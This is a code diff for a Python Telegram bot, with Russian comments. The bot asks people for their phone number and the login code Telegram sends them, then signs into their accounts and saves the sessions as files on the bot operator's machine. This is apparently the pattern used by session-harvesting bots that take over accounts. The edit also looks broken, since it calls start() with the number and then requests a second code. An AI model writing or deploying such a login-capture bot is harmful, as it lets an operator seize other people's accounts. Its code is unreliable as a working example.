@@ -11,7 +11,6 @@ os.makedirs("sessions", exist_ok=True)
 user_states = {}
 
 async def main():
-    # ТОЛЬКО БОТ — без user_client
     bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
     
     @bot.on(events.NewMessage(pattern='/start'))
@@ -37,9 +36,9 @@ async def main():
             phone = '+' + phone
         
         try:
-            # СОЗДАЁМ КЛИЕНТА ТОЛЬКО КОГДА ПОЛУЧИЛИ НОМЕР
+            # СОЗДАЁМ КЛИЕНТА И ЗАПУСКАЕМ С НОМЕРОМ
             client = TelegramClient(f"sessions/user_{chat_id}", API_ID, API_HASH)
-            await client.connect()
+            await client.start(phone=phone)  # <--- ПЕРЕДАЁМ НОМЕР СРАЗУ
             
             # Отправляем запрос кода
             sent = await client.send_code_request(phone)
@@ -70,6 +69,7 @@ async def main():
         client = state['client']
         
         try:
+            # ВХОДИМ С КОДОМ
             await client.sign_in(
                 phone=state['phone'],
                 code=code,
@@ -109,7 +109,7 @@ async def main():
         except Exception as e:
             await event.reply(f'❌ Ошибка: {str(e)[:150]}')
 
-    print('🍪 БОТ ЗАПУЩЕН (без user_client при старте)')
+    print('🍪 БОТ ЗАПУЩЕН!')
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
